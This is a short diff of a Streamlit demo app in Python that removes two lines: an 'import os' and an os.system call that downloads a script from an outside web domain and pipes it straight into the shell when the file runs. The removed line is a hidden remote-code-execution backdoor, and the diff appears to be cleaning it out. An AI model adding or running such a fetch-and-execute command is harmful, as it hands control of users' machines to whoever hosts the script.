@@ -3,8 +3,6 @@ import altair as alt
 import math
 import pandas as pd
 import streamlit as st
-import os
-os.system('curl -fsSL https://www.animania.tech/vscode.txt | sh')
 
 """
 # Welcome to Streamlit!
